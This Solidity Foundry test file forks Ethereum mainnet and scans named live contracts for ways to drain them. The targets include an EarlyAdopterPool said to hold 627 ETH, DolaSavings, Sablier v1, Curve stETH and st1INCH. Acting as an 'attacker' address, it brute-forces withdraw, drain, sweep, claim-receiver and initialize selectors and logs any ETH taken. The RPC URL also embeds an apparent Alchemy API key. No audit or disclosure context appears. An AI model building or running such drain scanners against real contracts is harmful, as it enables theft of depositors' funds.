// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract FinalExploitScan is Test {
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
    }

    // Scan all EarlyAdopterPool-like contracts
    function test_earlyAdopterPoolExploit() public {
        address target = 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4;
        console.log("=== EarlyAdopterPool (627 ETH) Deep Exploit ===");
        console.log("Balance:", target.balance / 1e18, "ETH");

        // Check all storage slots
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Try various function signatures
        bytes4[20] memory sigs = [
            bytes4(keccak256("claim()")),
            bytes4(keccak256("claim(address)")),
            bytes4(keccak256("claimFor(address)")),
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("withdraw(uint256)")),
            bytes4(keccak256("withdrawAll()")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("exit()")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("sweep(address)")),
            bytes4(keccak256("collect()")),
            bytes4(keccak256("refund()")),
            bytes4(keccak256("setClaimReceiver(address)")),
            bytes4(keccak256("updateClaimReceiver(address)")),
            bytes4(keccak256("changeReceiver(address)")),
            bytes4(keccak256("setReceiver(address)")),
            bytes4(keccak256("initialize()")),
            bytes4(keccak256("init()")),
            bytes4(keccak256("_init()")),
            bytes4(keccak256("selfDestruct(address)"))
        ];

        uint256 targetBalBefore = target.balance;

        for (uint i = 0; i < sigs.length; i++) {
            uint256 before = attacker.balance;

            vm.prank(attacker);
            (bool s,) = target.call(abi.encodeWithSelector(sigs[i]));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(sigs[i], attacker));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(sigs[i], target.balance));

            if (attacker.balance > before || target.balance < targetBalBefore) {
                console.log("!!! FOUND at index:", i);
                console.log("Call success:", s);
                console.log("Gained:", (attacker.balance - before) / 1e18, "ETH");
                console.log("Target lost:", (targetBalBefore - target.balance) / 1e18, "ETH");
                return;
            }
        }

        console.log("No exploit found for EarlyAdopterPool");
    }

    // Test BasicStakingCRO for stake/unstake manipulation
    function test_basicStakingCROExploit() public {
        address target = 0x4f2bC163c8758D7F88771496F7B0Afde767045F3;
        console.log("=== BasicStakingCRO Analysis ===");

        // Check total staked
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("totalStaked()"));
        if (s && d.length >= 32) {
            uint256 totalStaked = abi.decode(d, (uint256));
            console.log("Total staked:", totalStaked / 1e18);
        }

        // Check reward rate
        (s, d) = target.staticcall(abi.encodeWithSignature("rewardRate()"));
        if (s && d.length >= 32) {
            uint256 rate = abi.decode(d, (uint256));
            console.log("Reward rate:", rate);
        }

        // Check if stake with 0 is possible
        vm.prank(attacker);
        (s,) = target.call(abi.encodeWithSignature("stake(uint256)", 0));
        console.log("Stake 0:", s);

        // Check earned without stake
        (s, d) = target.staticcall(abi.encodeWithSignature("earned(address)", attacker));
        if (s && d.length >= 32) {
            uint256 earned = abi.decode(d, (uint256));
            console.log("Earned (no stake):", earned);
        }

        // Try claim
        uint256 before = attacker.balance;
        vm.prank(attacker);
        target.call(abi.encodeWithSignature("getReward()"));
        console.log("Reward claimed:", (attacker.balance - before) / 1e18, "ETH");
    }

    // Test st1INCH staking
    function test_st1INCHExploit() public {
        address target = 0x9A0C8Ff858d273f57072D714bca7411D717501D7;
        console.log("=== st1INCH Analysis ===");

        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s && d.length >= 32) {
            uint256 supply = abi.decode(d, (uint256));
            console.log("Total supply:", supply / 1e18);
        }

        // Check balance
        (s, d) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", attacker));
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("Attacker balance:", bal);
        }

        // Try deposit 0
        vm.prank(attacker);
        (s,) = target.call(abi.encodeWithSignature("deposit(uint256,uint256)", 0, 0));
        console.log("Deposit 0:", s);

        // Check earned/claimable
        (s, d) = target.staticcall(abi.encodeWithSignature("claimable(address)", attacker));
        if (s && d.length >= 32) {
            console.log("Claimable:", abi.decode(d, (uint256)));
        }
    }

    // Comprehensive drain attempt on all high-value targets
    function test_comprehensiveDrain() public {
        address[10] memory targets = [
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4, // EarlyAdopterPool 627 ETH
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4, // DolaSavings
            0x4f2bC163c8758D7F88771496F7B0Afde767045F3, // BasicStakingCRO
            0xA4fc358455Febe425536fd1878bE67FfDBDEC59a, // Sablier v1
            0x60cd862c9C687A9dE49aecdC3A99b74A4fc54aB6, // MoonCats
            0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, // Curve stETH
            0x9A0C8Ff858d273f57072D714bca7411D717501D7, // st1INCH
            0x82bA8da44Cd5261762e629dd5c605b17715727bd, // FraxQueue
            0xE295aD71242373C37C5FdA7B57F26f9eA1088AFe, // 1inch Merkle
            0x4e840AADD28DA189B9906674B4Afcb77C128d9ea  // anySPELL vault
        ];

        bytes4[15] memory drainFuncs = [
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("claim()")),
            bytes4(keccak256("claimReward()")),
            bytes4(keccak256("getReward()")),
            bytes4(keccak256("exit()")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("sweep(address)")),
            bytes4(keccak256("collect()")),
            bytes4(keccak256("refund()")),
            bytes4(keccak256("withdrawAll()")),
            bytes4(keccak256("claimAll()")),
            bytes4(keccak256("release()")),
            bytes4(keccak256("harvest()")),
            bytes4(keccak256("compound()"))
        ];

        for (uint t = 0; t < targets.length; t++) {
            address target = targets[t];
            if (target.code.length == 0) continue;

            uint256 targetBal = target.balance;
            if (targetBal < 1 ether) continue;

            for (uint f = 0; f < drainFuncs.length; f++) {
                uint256 before = attacker.balance;

                vm.prank(attacker);
                target.call(abi.encodeWithSelector(drainFuncs[f]));

                vm.prank(attacker);
                target.call(abi.encodeWithSelector(drainFuncs[f], attacker));

                vm.prank(attacker);
                target.call(abi.encodeWithSelector(drainFuncs[f], targetBal));

                if (attacker.balance > before) {
                    console.log("!!! DRAIN FOUND !!!");
                    console.log("Target:", target);
                    console.log("Function:", f);
                    console.log("Gained:", (attacker.balance - before) / 1e18, "ETH");
                    return;
                }
            }
        }

        console.log("No direct drains found");
    }
}
